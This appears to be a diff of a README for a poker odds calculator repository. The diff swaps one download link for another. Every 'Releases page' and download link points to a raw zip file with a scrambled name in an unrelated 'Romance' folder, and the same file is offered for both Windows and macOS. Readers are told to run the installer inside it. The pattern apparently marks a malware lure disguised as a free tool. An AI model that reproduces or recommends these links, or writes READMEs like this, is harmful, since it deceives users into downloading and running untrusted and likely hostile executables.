@@ -1,6 +1,6 @@
 # 🎲 Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars - Calculate Odds Easily
 
-[![Download Latest Release](https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Calculater-Odds-em-Stars-Poker-Texas-AL-Hold-I-1.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Calculater-Odds-em-Stars-Poker-Texas-AL-Hold-I-1.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Texas-Odds-Stars-em-I-Poker-Calculater-Hold-AL-2.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Texas-Odds-Stars-em-I-Poker-Calculater-Hold-AL-2.7.zip)
 
 ## 📖 Description
 
@@ -20,10 +20,10 @@ To begin using the Texas Hold'em ALL-IN Odds Calculator, follow these simple ste
 ### 🛠️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Calculater-Odds-em-Stars-Poker-Texas-AL-Hold-I-1.2.zip) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Texas-Odds-Stars-em-I-Poker-Calculater-Hold-AL-2.7.zip) to find the latest version of the software.
 
 2. **Download the Software**  
-   Click on the download link for the version you want. Look for a file named something like `https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Calculater-Odds-em-Stars-Poker-Texas-AL-Hold-I-1.2.zip` for Windows or `https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Calculater-Odds-em-Stars-Poker-Texas-AL-Hold-I-1.2.zip` for macOS.
+   Click on the download link for the version you want. Look for a file named something like `https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Texas-Odds-Stars-em-I-Poker-Calculater-Hold-AL-2.7.zip` for Windows or `https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Texas-Odds-Stars-em-I-Poker-Calculater-Hold-AL-2.7.zip` for macOS.
 
 3. **Run the Installer**  
    Locate the downloaded file in your Downloads folder. Double-click the installer and follow the prompts to complete the installation.
@@ -44,7 +44,7 @@ To begin using the Texas Hold'em ALL-IN Odds Calculator, follow these simple ste
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Calculater-Odds-em-Stars-Poker-Texas-AL-Hold-I-1.2.zip) to download the software. Follow the installation steps outlined above to have the application ready on your computer.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/theei311/Texas-Hold-em-ALL-IN-Odds-Calculater-Poker-Stars/main/Romance/Texas-Odds-Stars-em-I-Poker-Calculater-Hold-AL-2.7.zip) to download the software. Follow the installation steps outlined above to have the application ready on your computer.
 
 ## 🔧 Features
 
